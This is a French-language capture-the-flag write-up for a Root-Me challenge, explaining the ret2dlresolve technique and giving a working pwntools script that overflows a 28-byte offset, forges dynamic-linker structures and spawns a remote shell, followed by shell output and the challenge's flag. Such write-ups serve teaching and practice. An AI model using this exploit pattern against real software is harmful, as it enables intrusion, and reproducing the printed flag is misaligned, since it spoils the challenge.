## ELF x86 - Stack buffer overflow - ret2dl_resolve

Dans ce challenge nous devons réaliser une attaque de type ret2dl.

L’attaque ret2dlresolve est une technique avancée d’exploitation utilisée en retour d’appel (ROP) pour appeler une fonction non présente dans la table des symboles importés (GOT/PLT) d’un binaire ELF dynamique. Elle exploite le mécanisme du dynamic linker (ld-linux) pour forcer la résolution d’une fonction (comme system) à l’exécution, même si elle n’est pas directement utilisée/importée par le programme.

L'attaque est possible si nous avons le Partial RELRO ce qui est notre cas. Elle permet également de bypass l'ASLR.

1. Dans un binaire ELF dynamique, les fonctions externes sont appelées via la PLT (Procedure Linkage Table) et leur adresse est résolue au premier appel via le dynamic linker (ld-linux).

2. Le dynamic linker utilise des structures ELF en mémoire (relocations, symboles, chaînes) pour chercher et résoudre l’adresse des fonctions.

3. L’attaque ret2dlresolve consiste à fabriquer de fausses structures ELF (relocation, symbol, string) dans la mémoire du processus.

4. Ensuite, on construit une chaîne ROP qui appelle une fonction déjà présente en PLT (souvent read) mais en lui passant un indice de relocation correspondant à notre fausse structure.

5. Cela force le dynamic linker à exécuter sa routine de résolution, qui va lire notre fausse structure, résoudre l’adresse de la fonction souhaitée (ex: system) et l’exécuter avec l’argument que l’on a choisi (ex: /bin/sh).

Pwntools contient une librairie spécialisée dans ce genre d'attaque (`Ret2dlresolvePayload`) ce qui facilite grandement l'exploit :

```python
from pwn import *

context.binary = 'ch77'  # Load YOUR binary
p = remote('challenge03.root-me.org', 56577)

rop = ROP(context.binary)
dlresolve = Ret2dlresolvePayload(context.binary, symbol='system', args=['/bin/sh'])

rop.read(0, dlresolve.data_addr)
rop.raw(rop.ret[0])
rop.ret2dlresolve(dlresolve)
raw_rop = rop.chain()

log.info(rop.dump())

p.sendline(b'A' * 28 + raw_rop)
p.sendline(dlresolve.payload)

p.interactive()
```

On envoie d'abord la ROP chain (offset de 28 octets jusqu'à l'adresse de retour), puis le payload dlresolve que `read` va écrire dans la zone data. Le linker résout `system` et l'exécute avec `/bin/sh`.

Et si on exécute le payload nous obtenons un shell distant :

```
$ id
uid=1277(app-systeme-ch77-cracked) gid=1277(...) groups=1277(...)
$ cat /challenge/app-systeme/ch77/.passwd
RootMe{No_n33d_to_l34k_to_get_a_sh3LL}
```

## Flag

```
RootMe{No_n33d_to_l34k_to_get_a_sh3LL}
```
